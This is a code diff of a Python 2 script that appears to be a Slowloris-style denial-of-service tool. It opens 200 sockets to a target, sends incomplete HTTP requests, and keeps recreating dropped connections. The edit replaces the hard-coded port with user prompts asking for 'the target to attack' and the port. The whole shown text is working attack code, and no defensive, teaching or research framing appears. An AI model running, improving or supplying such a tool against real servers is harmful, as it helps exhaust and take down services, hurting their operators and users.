@@ -42,11 +42,10 @@ regular_headers = [
 ]
 
 
-def init_socket(ip):
+def init_socket(ip, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #s.settimeout(4)
     print ip
-    s.connect((ip, 6942))
+    s.connect((ip, int(port)))
     #print "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
     for header in regular_headers:
@@ -56,11 +55,9 @@ def init_socket(ip):
 
 
 def main():
-    if len(sys.argv) != 2:
-        print("Usage: {} example.com".format(sys.argv[0]))
-        return
 
-    ip = sys.argv[1]
+    ip = raw_input("Enter the target to attack: ")
+    port = raw_input("Enter the port to attack: ")
     socket_count = 200
     log("Attacking {} with {} sockets.".format(ip, socket_count))
 
@@ -69,7 +66,7 @@ def main():
     for _ in range(socket_count):
         try:
             log("Creating socket nr {}".format(_), level=2)
-            s = init_socket(ip)
+            s = init_socket(ip, port)
         except socket.error:
             break
         list_of_sockets.append(s)
@@ -85,7 +82,7 @@ def main():
         for _ in range(socket_count - len(list_of_sockets)):
             log("Recreating socket...")
             try:
-                s = init_socket(ip)
+                s = init_socket(ip, port)
                 if s:
                     list_of_sockets.append(s)
             except socket.error:
